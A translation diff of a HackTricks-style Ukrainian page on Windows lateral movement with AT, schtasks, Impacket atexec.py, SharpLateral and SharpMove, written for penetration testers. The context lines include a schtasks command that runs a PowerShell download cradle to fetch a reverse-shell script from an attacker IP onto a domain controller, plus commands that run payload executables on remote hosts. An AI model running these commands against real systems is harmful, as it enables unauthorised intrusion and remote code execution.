@@ -4,11 +4,11 @@
 
 ## Як це працює
 
-At дозволяє планувати завдання на хостах, де ви знаєте ім'я користувача/(пароль/хеш). Отже, ви можете використовувати його для виконання команд на інших хостах і отримання виходу.
+At дозволяє планувати завдання на хостах, де вам відомі username/(password/Hash). Тож ви можете використовувати його для виконання команд на інших хостах і отримання результату.
 ```
 At \\victim 11:00:00PM shutdown -r
 ```
-Використовуючи schtasks, спочатку потрібно створити задачу, а потім викликати її:
+За допомогою schtasks спочатку потрібно створити завдання, а потім викликати його:
 ```bash
 schtasks /create /n <TASK_NAME> /tr C:\path\executable.exe /sc once /st 00:00 /S <VICTIM> /RU System
 schtasks /run /tn <TASK_NAME> /S <VICTIM>
@@ -18,7 +18,7 @@ schtasks /run /tn <TASK_NAME> /S <VICTIM>
 schtasks /create /S dcorp-dc.domain.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "MyNewtask" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/InvokePowerShellTcp.ps1''')'"
 schtasks /run /tn "MyNewtask" /S dcorp-dc.domain.local
 ```
-Ви можете використовувати **Impacket's `atexec.py`** для виконання команд на віддалених системах за допомогою команди AT. Це вимагає дійсних облікових даних (ім'я користувача та пароль або хеш) для цільової системи.
+Ви можете використовувати **`atexec.py` з Impacket**, щоб виконувати команди у віддалених системах за допомогою команди AT. Для цього потрібні дійсні облікові дані (ім’я користувача та пароль або hash) цільової системи.
 ```bash
 atexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' whoami
 ```
@@ -30,6 +30,6 @@ SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskNa
 ```bash
 SharpMove.exe action=taskscheduler computername=remote.host.local command="C:\windows\temp\payload.exe" taskname=Debug amsi=true username=domain\\user password=password
 ```
-Більше інформації про [**використання schtasks з silver tickets тут**](../active-directory-methodology/silver-ticket.md#host).
+Більше інформації про [**використання schtasks із silver tickets тут**](../active-directory-methodology/silver-ticket.md#host).
 
 {{#include ../../banners/hacktricks-training.md}}
